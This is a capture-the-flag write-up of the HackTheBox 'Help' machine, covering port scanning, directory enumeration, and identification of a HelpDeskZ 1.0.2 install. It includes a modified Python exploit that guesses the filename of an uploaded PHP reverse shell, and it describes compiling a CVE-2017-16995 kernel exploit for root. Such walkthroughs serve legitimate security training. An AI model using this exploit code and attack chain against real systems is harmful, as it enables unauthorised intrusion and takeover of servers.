![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/addb842d-c4bf-4aed-b681-0ffc74ab64f0)

https://app.hackthebox.com/machines/Help

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Enumeration:

I initiated the enumeration process with a rapid rustscan, revealing the existence of three open ports on the target system: 22, 80, and 3000.

```bash
sudo rustscan -a 10.10.10.121 -- -sC -sV -vv -oN help_nmap
```
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/63f363fd-7d91-4d9d-bbc9-8fed5c1e10a1)

```Rust
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e5:bb:4d:9c:de:af:6b:bf:ba:8c:22:7a:d8:d7:43:28 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCZY4jlvWqpdi8bJPUnSkjWmz92KRwr2G6xCttorHM8Rq2eCEAe1ALqpgU44L3potYUZvaJuEIsBVUSPlsKv+ds8nS7Mva9e9ztlad/fzBlyBpkiYxty+peoIzn4lUNSadPLtYH6khzN2PwEJYtM/b6BLlAAY5mDsSF0Cz3wsPbnu87fNdd7WO0PKsqRtHpokjkJ22uYJoDSAM06D7uBuegMK/sWTVtrsDakb1Tb6H8+D0y6ZQoE7XyHSqD0OABV3ON39GzLBOnob4Gq8aegKBMa3hT/Xx9Iac6t5neiIABnG4UP03gm207oGIFHvlElGUR809Q9qCJ0nZsup4bNqa/
|   256 d5:b0:10:50:74:86:a3:9f:c5:53:6f:3b:4a:24:61:19 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHINVMyTivG0LmhaVZxiIESQuWxvN2jt87kYiuPY2jyaPBD4DEt8e/1kN/4GMWj1b3FE7e8nxCL4PF/lR9XjEis=
|   256 e2:1b:88:d3:76:21:d4:1e:38:15:4a:81:11:b7:99:07 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHxDPln3rCQj04xFAKyecXJaANrW3MBZJmbhtL4SuDYX
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.18
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Did not follow redirect to http://help.htb/
3000/tcp open  http    syn-ack ttl 63 Node.js Express framework
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (application/json; charset=utf-8).
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The scan results unveiled the following insights:

- Port 22 is operational, hosting the SSH service, a default presence in most systems.
- Port 80 accommodates an HTTP server associated with the domain "help.htb," a discovery promptly added to my host configuration file.
- Additionally, port 3000 also supports an HTTP server, notably employing the "Node.js Express framework."

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

### Fuzzing:

Upon concluding the port scan, I proceeded to explore the "http://help.htb" domain. Regrettably, it led me to a default Apache server page, signifying no substantial breakthrough.

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/f0c31e9e-9df0-4219-91de-36cb918a90d9)

My attention shifted towards port 3000, where a rather intriguing note awaited: "Hi Shiv, To gain access, please locate the credentials using the provided query."

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/828494b0-b3e3-4fa2-946c-791597e9d63f)

Conducting further exploration, I employed sub-directory enumeration on "help.htb" and was rewarded with the discovery of two new directories:

```bash
gobuster dir -u http://help.htb/ -t 10 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o help_web -x txt,php,congif,aspx -e -b 404,403 -k
```
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/76b815b2-595b-43f1-98b7-84d8b91f44d7)

While I encountered restrictions accessing the JavaScript endpoint, I successfully navigated to "help.htb/support," unveiling the presence of a "HelpDeskZ" application.

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/92905cb7-05ae-488c-8668-d466e9c9e402)

To determine the viability of exploitation, I explored possible exploits for "HelpDeskZ" through the searchsploit tool. Among the results, one exploit captured my attention: "Arbitrary file upload for version 1.0.2."

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/cf470d0e-7213-41f9-83f0-8c933df4d9be)

However, before proceeding, I needed to ascertain the precise version of HelpDeskZ in operation. Consequently, I sought out the HelpDeskZ GitHub [repository](https://github.com/alitalaghat/HelpDeskZ-1.0). Simultaneously, I initiated sub-directory enumeration to unveil more clues. This endeavor led me to a GitHub repository containing various directories, possibly aligned with the application.

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/e3023354-426a-45f3-88f2-a7ade9d45558)

Further strengthening my belief in the version identification, the outcomes from the gobuster scan aligned remarkably well with the directories discovered on GitHub:

```bash
gobuster dir -u http://help.htb/support/ -t 20 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php -e -b 404,403 -k
```
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/5e5eca4d-a4c3-407e-91b3-0074be4a6d80)

This solidified my confidence in HelpDeskZ version 1.0.2 as the target, as none of the other versions exhibited similar directory structures.

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Initial access:

Having confirmed the version of HelpDeskZ in operation, I proceeded by downloading the Python exploit from searchsploit. As the exploit elucidated:

```
The software in the default configuration allows upload for .php-Files ( !! ). I think the developers thought it was no risk, because the filenames get obfuscated when they are uploaded. However, there is a weakness in the rename function of the uploaded file

controllers httpsgithub.comevolutionscriptHelpDeskZ-1.0tree006662bb856e126a38f2bb76df44a2e4e3d37350controllerssubmit_ticket_controller.php - Line 141
$filename = md5($_FILES['attachment']['name'].time())...$ext;

So by guessing the time the file was uploaded, we can get RCE.
```
Following the steps outlined in the exploit, I crafted and submitted a ticket via the forum. I included a PHP reverse shell file, and subsequently executed the Python script. Regrettably, despite multiple attempts, I was unable to successfully trigger the execution of my shell:

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/452628ea-1dd8-4e57-9c13-01b44f854eb7)

### Exploit code review & changes:

Continuing with the exploration, I scrutinized the application's source code and identified that files were uploaded to the '/ticket' directory.

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/e65d1588-1fbc-43c2-9740-f357f62f86a7)

Subsequently, I made pertinent changes to the exploit code. Specifically, I removed the user input argument section, manually specified the file location, and determined the file name. The resulting code reflects the modifications:

```python
import hashlib
import time
import sys
import requests
import datetime

print 'Helpdeskz v1.0.2 - Unauthenticated shell upload exploit'

''' #commented this part to stop taking user argument
if len(sys.argv) < 3:
    print "Usage {} [baseUrl] [nameOfUploadedFile]".format(sys.argv[0])
    sys.exit(1)
'''

helpdeskzBaseUrl = 'http://help.htb/support/uploads/tickets/'
fileName = 'better_rev.php' #This is the pentest-monkey PHP reverse shell script, listening on 1337


r = requests.get(helpdeskzBaseUrl)

#Gets the current time of the server to prevent timezone errors - DoctorEww
currentTime = int((datetime.datetime.strptime(r.headers['date'], '%a, %d %b %Y %H:%M:%S %Z')  - datetime.datetime(1970,1,1)).total_seconds())

for x in range(0, 300):
    plaintext = fileName + str(currentTime - x)
    md5hash = hashlib.md5(plaintext).hexdigest()

    url = helpdeskzBaseUrl+md5hash+'.php'
    response = requests.head(url)
    if response.status_code == 200:
        print 'found!'
        print url
        sys.exit(0)

print 'Sorry, I did not find anything'
```

Upon implementing these changes, I re-executed the code, initiated my netcat listener, and successfully obtained a shell as the "help" user. Additionally, I retrieved the user flag from the "help" user's home directory. (Pwn3d! 🙂)

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/867ba655-85fb-4d5f-a3ac-6d6a6007ed59)
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/db85ec0b-1446-4923-8ed5-42f780f9ef78)

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/cf4d8efe-2e68-4fe8-bd97-568d7e3e5c24)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Privilege Escalation:

With the user flag secured, my subsequent objective was to gain root-level privileges and ultimately acquire the root flag. To facilitate this, I embarked on a meticulous process of manual enumeration:

- I initiated a review of the sudo privileges via the command "sudo -l". However, since I did not possess the necessary user credentials, I was precluded from executing this command.
- Delving into potential cron jobs, I did not detect any active cron tasks.
- Turning my attention to the operating system's version, I determined that it was operating on "4.4.0-116-generic #140-Ubuntu".

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/e474ad75-0d39-45f9-a984-921cc547834e)

Further investigation into the Linux kernel version in searchsploit revealed a vulnerability marked as "CVE-2017-16995", accompanied by an available exploit.

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/98aa420e-1da0-4078-90f3-1b644165684d)


Subsequently, I retrieved and compiled the corresponding C-based exploit:

```bash
gcc 44298.c -o exploit
```

Once the exploit was successfully compiled, I transferred it to the target system and executed it.

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/a2dd9933-d91b-46a2-81b7-bcc72daab21e)

Upon successfully transferring and executing the exploit, I expeditiously obtained a root-level shell, thus enabling me to seize the coveted root flag. (Pwn3d! 🙂)

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/e03f86f3-75f4-496e-9bcb-6f56dcbc19bc)
